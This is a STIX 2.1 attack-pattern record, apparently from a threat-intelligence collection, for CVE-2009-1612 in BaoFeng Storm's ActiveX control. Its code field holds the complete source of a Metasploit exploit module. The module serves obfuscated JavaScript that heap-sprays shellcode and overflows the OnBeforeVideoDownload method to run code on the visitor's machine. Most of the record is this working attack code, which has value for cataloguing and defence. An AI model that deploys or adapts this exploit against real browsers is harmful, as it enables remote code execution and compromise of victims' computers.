{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a926aa09-1fb4-4985-a35b-352f6bea531c",
    "created": "2024-08-14T16:43:41.229191Z",
    "modified": "2024-08-14T16:43:41.229195Z",
    "name": "BaoFeng Storm mps.dll ActiveX OnBeforeVideoDownload Buffer Overflow",
    "description": " This module exploits a buffer overflow in BaoFeng's Storm media Player ActiveX control. Versions of mps.dll including 3.9.4.27 and lower are affected. When passing an overly long string to the method \"OnBeforeVideoDownload\" an attacker can execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/baofeng_storm_onbeforevideodownload.rb",
            "external_id": "baofeng_storm_onbeforevideodownload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1612"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BaoFeng Storm mps.dll ActiveX OnBeforeVideoDownload Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in BaoFeng's Storm media Player ActiveX\n        control. Versions of mps.dll including 3.9.4.27 and lower are affected. When passing\n        an overly long string to the method \"OnBeforeVideoDownload\" an attacker can execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1612' ],\n          [ 'OSVDB', '54169' ],\n          [ 'BID', '34789' ],\n          [ 'EDB', '8579' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # untested, please contribute the vulnerable software if possible.\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2009-04-30',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n        ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # ActiveX parameters\n    clsid = \"6BE52E1D-E586-474F-A6E2-1A85A9B4D9FB\"\n    progid = \"MPS.StormPlayer.1\"\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Prepare the heap spray parameters\n    spray_addr = 0x0c0c0c0c\n    spray_num = \"0x%x\" % spray_addr\n    spray_str = Rex::Text.to_hex([spray_addr].pack('V'), '%')\n\n    # Generate the final javascript\n    js = %Q|\ntry {\nvar vulnerable = new ActiveXObject('#{progid}');\nvar my_unescape = unescape;\nvar shellcode = '#{shellcode}';\n#{js_heap_spray}\nsprayHeap(my_unescape(shellcode), #{spray_num}, 0x40000);\nvar evil_string = '';\nwhile (evil_string.length < 4150)\nevil_string += my_unescape('#{spray_str}');\nvulnerable.OnBeforeVideoDownload(evil_string);\n} catch( e ) { window.location = 'about:blank' ; }\n|\n\n    # Obfuscate the javascript\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => %w{ vulnerable shellcode my_unescape index evil_string }\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.update_opts(js_heap_spray.opts)\n    js.obfuscate(memory_sensitive: true)\n\n    # Generate the final HTML\n    content = %Q|<html>\n<body>\n<script><!--\n#{js}\n//</script>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-30",
    "x_mitre_platforms": [
        "win'"
    ]
}